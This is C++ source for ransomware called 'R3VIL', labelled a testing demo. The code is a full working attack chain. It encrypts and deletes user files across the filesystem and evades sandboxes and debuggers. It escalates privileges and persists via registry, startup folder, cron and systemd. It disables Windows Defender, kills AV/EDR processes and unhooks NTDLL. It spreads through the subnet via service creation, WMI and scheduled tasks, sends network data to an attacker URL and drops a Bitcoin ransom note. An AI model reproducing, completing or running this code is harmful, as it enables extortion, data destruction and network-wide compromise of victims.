// r3vil.cpp - R3VIL Ransomware Demo with GUI + Advanced Stealth Lateral Movement + AV/EDR Disable
#include <cryptopp/cryptlib.h>
#include <cryptopp/aes.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shellapi.h>          // Untuk SHELLEXECUTEINFOA & ShellExecuteExA
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <sstream>
#include <random>

#include "src/network_mapper.h"
#include "src/ransom_gui.h"          // GUI Always-on-Top

using namespace CryptoPP;
namespace fs = std::filesystem;

// ====================== KONFIGURASI ======================
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mov", ".avi",
    ".sql", ".db", ".cpp", ".h", ".py", ".js", ".ts",
    ".csv", ".zip", ".rar", ".7z", ".md"
};

const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };

const std::vector<std::string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
    "rs", "rs.cpp", "rs_debug", "generate_keys"
};

const std::string LOG_FILE = "affected_files.log";

const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
#ifdef _WIN32
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\", "C:\\System Volume Information\\",
    "C:\\PerfLogs\\", "C:\\Recovery\\"
#else
    "/bin/", "/sbin/", "/etc/", "/dev/", "/proc/", "/sys/", "/lib/", "/lib64/",
    "/usr/", "/var/log/", "/run/", "/boot/", "/root/.ssh/", "/etc/ssh/",
    "/snap/", "/var/lib/snapd/"
#endif
};

const std::string PUBLIC_KEY_FILE = "rsa_public.der";

// Daftar proses AV/EDR untuk di-kill
const std::vector<std::string> AV_EDR_PROCESSES = {
    "MsMpEng.exe", "MsSense.exe", "Sense.exe", "csfalcon.exe", "falcon.exe",
    "sentinelagent.exe", "cb.exe", "edr.exe", "xagt.exe", "avp.exe", "bdagent.exe"
};

// ====================== GLOBAL MUTEX ======================
std::mutex log_mutex;

// ====================== THREAD POOL ======================
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    std::atomic<bool> stop{false};

public:
    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queue_mutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }

    template<class F>
    void enqueue(F&& task) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(task));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        stop = true;
        condition.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};

// ====================== HELPER FUNCTIONS ======================
std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

bool should_encrypt(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::string lname = to_lower(filename);
    for (const auto& ext : ENCRYPTED_EXTENSIONS) if (ends_with(lname, ext)) return false;
    for (const auto& kw : EXCLUDE_KEYWORDS) if (lname.find(to_lower(kw)) != std::string::npos) return false;
    for (const auto& ext : TARGET_EXTENSIONS) if (ends_with(lname, ext)) return true;
    return false;
}

bool is_critical_path(const std::string& path) {
    std::string lpath = to_lower(path);
    for (const auto& prefix : CRITICAL_SKIP_PREFIXES) {
        if (lpath.find(to_lower(prefix)) == 0) return true;
    }
    return false;
}

std::vector<std::string> get_all_roots() {
    std::vector<std::string> roots = {".", "/home", "/", "/root"};
    return roots;
}

std::string exec_cmd(const std::string& cmd) {
    char buffer[256];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    pclose(pipe);
    return result;
}

// ====================== EVASION ======================
bool is_proot_anlinux() {
    if (getenv("PROOT")) return true;
    if (access("/.dockerenv", F_OK) == 0) return true;
    std::string uname = exec_cmd("uname -a 2>/dev/null");
    if (uname.find("Android") != std::string::npos) return true;
    return false;
}

bool is_virtual_machine() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    return false;
}

bool is_debugger_present() {
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") == 0) return std::stoi(line.substr(10)) != 0;
    }
    return false;
}

bool is_sandbox_environment() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    std::string up = exec_cmd("cat /proc/uptime 2>/dev/null | awk '{print $1}' || echo '0'");
    if (!up.empty() && std::stod(up) < 300) return true;
    return false;
}

void perform_evasion_checks() {
    std::cout << "[*] Running anti-analysis & evasion checks...\n";
    if (getenv("REVIL_BYPASS")) {
        std::cout << "[!] Evasion bypass activated (REVIL_BYPASS=1)\n";
        return;
    }
    if (is_proot_anlinux()) {
        std::cout << "[!] AnLinux / proot environment detected → Evasion bypassed.\n";
        return;
    }

    if (is_virtual_machine() || is_debugger_present() || is_sandbox_environment()) {
        std::cout << "[!] Suspicious environment detected! Exiting silently...\n";
        std::this_thread::sleep_for(std::chrono::seconds(3));
        exit(0);
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(800, 2500);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));

    std::cout << "[✓] Evasion checks passed.\n";
}

// ====================== PERSISTENCE MANAGER ======================
class PersistenceManager {
private:
    std::string current_exe;

    std::string get_current_exe() {
#ifdef _WIN32
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
#else
        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
        if (len != -1) {
            path[len] = '\0';
            return std::string(path);
        }
        return "";
#endif
    }

public:
    PersistenceManager() {
        current_exe = get_current_exe();
    }

    bool try_escalate_privileges() {
#ifdef __linux__
        if (geteuid() == 0) {
            std::cout << "[✓] Already running as ROOT\n";
            return true;
        }
        std::cout << "[!] Trying privilege escalation...\n";
        setenv("REVIL_ESCALATED", "1", 1);
        execlp("pkexec", "pkexec", current_exe.c_str(), nullptr);
        system(("sudo " + current_exe).c_str());
        exit(1);
#endif
        return false;
    }

    void install_all() {
        std::cout << "[*] Installing persistence mechanisms...\n";
#ifdef _WIN32
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdateSvc", 0, REG_SZ, (BYTE*)current_exe.c_str(), current_exe.size() + 1);
            RegCloseKey(hKey);
            std::cout << "[✓] Registry Run persistence added\n";
        }
        char startup[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
        std::string startup_path = std::string(startup) + "\\SystemHelper.exe";
        CopyFileA(current_exe.c_str(), startup_path.c_str(), FALSE);
        std::cout << "[✓] Startup folder persistence added\n";
#else
        std::string cron = "(crontab -l 2>/dev/null; echo \"*/10 * * * * " + current_exe + " >/dev/null 2>&1\") | crontab -";
        system(cron.c_str());
        std::cout << "[✓] Cron persistence installed\n";

        if (geteuid() == 0) {
            std::ofstream svc("/etc/systemd/system/revil-update.service");
            svc << "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n";
            svc << "[Service]\nType=simple\nExecStart=" << current_exe << "\nRestart=always\nRestartSec=60\n";
            svc << "[Install]\nWantedBy=multi-user.target\n";
            svc.close();
            system("systemctl daemon-reload 2>/dev/null && systemctl enable revil-update.service 2>/dev/null");
            std::cout << "[✓] Systemd persistence installed\n";
        }
#endif
    }
};

// ====================== WALLPAPER CHANGER ======================
class WallpaperChanger {
private:
    std::string create_ransom_wallpaper() {
        const char* home = getenv("HOME");
        if (!home) home = "/tmp";
        std::string ppm = std::string(home) + "/.ransom.ppm";
        std::string jpg = std::string(home) + "/.ransom.jpg";

        std::ofstream f(ppm, std::ios::binary);
        int w=800, h=500;
        f << "P6\n" << w << " " << h << "\n255\n";
        for (int y=0; y<h; y++) for (int x=0; x<w; x++) {
            unsigned char p[3];
            if (y<80 || y>h-80) {p[0]=0;p[1]=0;p[2]=0;}
            else if (x>100 && x<w-100 && y>150 && y<350) {p[0]=255;p[1]=255;p[2]=255;}
            else {p[0]=180;p[1]=0;p[2]=0;}
            f.write((char*)p,3);
        }
        f.close();
        system(("convert " + ppm + " " + jpg + " 2>/dev/null || cp " + ppm + " " + jpg).c_str());
        fs::remove(ppm);
        return jpg;
    }

public:
    void change_wallpaper() {
        std::cout << "[*] Changing wallpaper...\n";
        std::string wp = create_ransom_wallpaper();

#ifdef _WIN32
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wp.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        std::cout << "[✓] Windows wallpaper changed\n";
#else
        std::vector<std::string> cmds = {
            "gsettings set org.gnome.desktop.background picture-uri 'file://" + wp + "' 2>/dev/null",
            "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s '" + wp + "' 2>/dev/null",
            "feh --bg-scale '" + wp + "' 2>/dev/null"
        };
        bool ok = false;
        for (auto& c : cmds) if (system(c.c_str()) == 0) { ok = true; break; }
        if (ok) std::cout << "[✓] Linux wallpaper changed\n";
        else std::cout << "[!] Could not change wallpaper\n";
#endif
    }

    void create_readme_file() {
        std::string path;
#ifdef _WIN32
        char desk[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desk);
        path = std::string(desk) + "\\README_LOCKED.txt";
#else
        const char* home = getenv("HOME");
        if (!home) home = ".";
        path = std::string(home) + "/Desktop/README_LOCKED.txt";
#endif

        std::ofstream f(path);
        if (f) {
            f << "========================================\n";
            f << "     YOUR FILES HAVE BEEN ENCRYPTED     \n";
            f << "========================================\n\n";
            f << "To recover: Send $500 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n";
            f << "Email transaction ID to decrypt@onionmail.org\n";
            f.close();
            std::cout << "[✓] README_LOCKED.txt created on Desktop\n";
        }
    }
};

// ====================== SELF-DELETE ======================
void self_delete() {
    std::cout << "[*] Self-delete activated...\n";
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string cmd = "cmd.exe /c timeout 5 & del /f \"" + std::string(path) + "\"";
    system(cmd.c_str());
#else
    unlink("/proc/self/exe");
    std::cout << "[✓] Binary self-deleted.\n";
#endif
}

// ====================== STEALTH: NTDLL UNHOOKING ======================
#ifdef _WIN32
bool unhook_ntdll() {
    std::cout << "[*] Performing full NTDLL unhooking for EDR evasion...\n";
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    char szNtdllPath[MAX_PATH];
    GetSystemDirectoryA(szNtdllPath, MAX_PATH);
    strcat_s(szNtdllPath, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(szNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD dwSize = GetFileSize(hFile, NULL);
    BYTE* pFresh = new BYTE[dwSize];
    DWORD dwRead;
    ReadFile(hFile, pFresh, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFresh;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pFresh + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    BYTE* pTextFresh = nullptr;
    DWORD textSize = 0;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; ++i) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            pTextFresh = pFresh + pSection[i].PointerToRawData;
            textSize = pSection[i].SizeOfRawData;
            break;
        }
    }

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), hNtdll, &modInfo, sizeof(modInfo));
    BYTE* pTextHooked = (BYTE*)modInfo.lpBaseOfDll;

    DWORD oldProtect;
    VirtualProtect(pTextHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pTextHooked, pTextFresh, textSize);
    VirtualProtect(pTextHooked, textSize, oldProtect, &oldProtect);

    delete[] pFresh;
    std::cout << "[+] NTDLL successfully unhooked\n";
    return true;
}
#endif

// ====================== DISABLE AV/EDR ======================
void disable_av_edr_windows() {
#ifdef _WIN32
    std::cout << "[*] Aggressive AV/EDR disable (Windows)...\n";
    HKEY key; DWORD val = 1;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(key);
    }
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true\" 2>nul");

    for (const auto& proc : AV_EDR_PROCESSES) {
        std::string cmd = "taskkill /f /im \"" + proc + "\" >nul 2>&1";
        system(cmd.c_str());
    }
    system("net stop WinDefend /y 2>nul");
    system("sc config WinDefend start= disabled 2>nul");
    std::cout << "[!] AV/EDR disable attempts completed\n";
#endif
}

void disable_av_macos() {
#ifndef _WIN32
    std::cout << "[*] macOS AV/EDR disable (limited)...\n";
    system("pkill -9 Sophos CrowdStrike Sentinel Kaspersky Malwarebytes Avast 2>/dev/null || true");
#endif
}

// ====================== LATERAL MOVEMENT HELPERS ======================
std::string get_local_ip() {
    return "192.168.1.100"; // Ganti dengan fungsi dynamic jika perlu
}

std::vector<std::string> advanced_network_discovery() {
    std::vector<std::string> targets;
    std::string subnet = "192.168.1.";
    for (int i = 1; i <= 254; ++i) targets.push_back(subnet + std::to_string(i));
    return targets;
}

bool psexec_like_execute(const std::string& target, const std::string& remote_exe) {
#ifdef _WIN32
    SC_HANDLE hSC = OpenSCManagerA(("\\\\" + target).c_str(), NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSC) return false;
    SC_HANDLE hSvc = CreateServiceA(hSC, "RevilTmpSvc", "Windows Update Service",
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, remote_exe.c_str(), NULL, NULL, NULL, NULL, NULL);
    bool success = (hSvc != NULL);
    if (hSvc) {
        StartServiceA(hSvc, 0, NULL);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSC);
    return success;
#else
    return false;
#endif
}

bool wmi_remote_execute(const std::string& target, const std::string& command) {
#ifdef _WIN32
    std::string cmd = "wmic /node:\"" + target + "\" process call create \"" + command + "\" >nul 2>&1";
    return system(cmd.c_str()) == 0;
#else
    return false;
#endif
}

bool create_remote_scheduled_task(const std::string& target, const std::string& command) {
#ifdef _WIN32
    std::string cmd = "schtasks /create /s " + target + " /ru SYSTEM /tr \"" + command + "\" /tn RevilTask /f >nul 2>&1";
    return system(cmd.c_str()) == 0;
#else
    return false;
#endif
}

// ====================== ENCRYPT FILE & DIRECTORY ======================
void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv) {
    try {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [*] Encrypting: " << filepath << "\n";

        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));

        CBC_Mode<AES>::Encryption enc;
        enc.SetKeyWithIV(key, key.size(), iv);

        std::string ciphertext;
        StringSource(plaintext, true, new StreamTransformationFilter(enc, new StringSink(ciphertext)));

        std::string encpath = filepath + ".revil";
        FileSink out(encpath.c_str());
        out.Put(iv, AES::BLOCKSIZE);
        out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
        out.MessageEnd();

        fs::remove(filepath);

        std::ofstream log(LOG_FILE, std::ios::app);
        if (log) log << filepath << " → " << encpath << "\n";
        std::cout << "  [✓] Encrypted: " << filepath << "\n";
    } catch (...) {
        std::cout << "  [✗] Failed: " << filepath << "\n";
    }
}

void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Scanning: " << root << "\n";
    std::vector<std::string> files;
    try {
        for (const auto& e : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (e.is_regular_file() && should_encrypt(e.path().string()) && !is_critical_path(e.path().string())) {
                files.push_back(e.path().string());
            }
        }
    } catch (...) {}
    if (files.empty()) return;

    ThreadPool pool(8);
    for (const auto& f : files) {
        pool.enqueue([&f, &key, iv]() { encrypt_file(f, key, iv); });
    }
}

// ====================== PERFORM LATERAL MOVEMENT (FULL STEALTH) ======================
void perform_lateral_movement(const SecByteBlock& aes_key, const byte* iv) {
    std::cout << "[*] Starting STEALTHY Advanced Lateral Movement + AV/EDR Disable...\n";

#ifdef _WIN32
    unhook_ntdll();
    disable_av_edr_windows();
#else
    disable_av_macos();
#endif

    auto targets = advanced_network_discovery();
    std::cout << "[+] Discovered " << targets.size() << " potential targets\n";

    ThreadPool pool(16);

    for (const auto& target : targets) {
        if (target == get_local_ip() || target.find("127.") == 0 || target.find("169.254") == 0) continue;

        pool.enqueue([target, &aes_key, iv]() {
            std::this_thread::sleep_for(std::chrono::milliseconds(800 + (rand() % 3200)));

#ifdef _WIN32
            std::string payload_name = "svchost_update.exe";
            std::string remote_path = "\\\\" + target + "\\C$\\Windows\\Temp\\" + payload_name;

            char self_exe[MAX_PATH];
            GetModuleFileNameA(NULL, self_exe, MAX_PATH);

            if (CopyFileA(self_exe, remote_path.c_str(), FALSE)) {
                std::cout << "[+] Payload copied to " << target << "\n";

                if (psexec_like_execute(target, "C:\\Windows\\Temp\\" + payload_name)) {
                    std::cout << "[+] PsExec-style SUCCESS on " << target << "\n";
                    return;
                }
                if (wmi_remote_execute(target, "C:\\Windows\\Temp\\" + payload_name)) {
                    std::cout << "[+] WMI SUCCESS\n";
                    return;
                }
                if (create_remote_scheduled_task(target, "C:\\Windows\\Temp\\" + payload_name)) {
                    std::cout << "[+] Scheduled Task SUCCESS\n";
                    return;
                }

                // Fallback
                std::string exec_path = "\\\\" + target + "\\C$\\Windows\\Temp\\" + payload_name;
                SHELLEXECUTEINFOA sei = { sizeof(sei) };
                sei.lpVerb = "open";
                sei.lpFile = exec_path.c_str();
                sei.nShow = SW_HIDE;
                ShellExecuteExA(&sei);
            }
#else
            std::cout << "[*] Linux lateral movement (basic)\n";
#endif
        });
    }

    std::cout << "[*] Stealth lateral movement phase completed.\n";
}

// ====================== MAIN ======================
int main() {
    perform_evasion_checks();

    std::cout << "\n========================================\n";
    std::cout << "     RANSOMWARE DEMO - FOR TESTING     \n";
    std::cout << "========================================\n\n";

    std::cout << "[*] Starting network mapping...\n";
    {
        NetworkMapper mapper;
        mapper.perform_mapping();
        mapper.send_to_attacker("http://192.168.1.2:5000");
    }
    std::cout << "[✓] Network mapping completed\n";

    PersistenceManager persistence;
    persistence.try_escalate_privileges();

    if (!fs::exists(PUBLIC_KEY_FILE)) {
        std::cout << "[!] rsa_public.der not found! Please run ./generate first.\n";
        return 1;
    }

    AutoSeededRandomPool prng;
    SecByteBlock key(32);
    byte iv[AES::BLOCKSIZE];
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, sizeof(iv));

    std::cout << "[*] Encrypting AES key with RSA Public Key...\n";
    try {
        RSA::PublicKey pub;
        FileSource fs(PUBLIC_KEY_FILE.c_str(), true);
        pub.Load(fs);

        RSAES_OAEP_SHA_Encryptor encryptor(pub);

        std::string enc_key;
        StringSource ss(key, key.size(), true,
            new PK_EncryptorFilter(prng, encryptor, new StringSink(enc_key))
        );

        FileSink fileSink("aes_key.enc", true);
        fileSink.Put(reinterpret_cast<const byte*>(enc_key.data()), enc_key.size());
        fileSink.MessageEnd();

        std::cout << "[✓] AES key successfully encrypted and saved to aes_key.enc\n";
    } catch (const std::exception& e) {
        std::cout << "[✗] Failed to encrypt AES key: " << e.what() << std::endl;
        return 1;
    }

    perform_lateral_movement(key, iv);

    std::cout << "\n[*] Starting file encryption...\n";
    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, iv);
    }

    WallpaperChanger wallpaper;
    wallpaper.change_wallpaper();
    wallpaper.create_readme_file();

    std::cout << "[*] Meluncurkan Ransom GUI (Always-on-Top)...\n";
    RansomGUI ransomGUI;
    ransomGUI.start("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "decrypt@onionmail.org", 500.0, 72);

    persistence.install_all();

    std::cout << "[!] GUI aktif. Program akan terus berjalan...\n";
    std::this_thread::sleep_for(std::chrono::hours(168));

    std::cout << "[*] Self-deleting...\n";
    self_delete();

    std::cout << "\n[✓] Demo finished.\n";
    return 0;
}
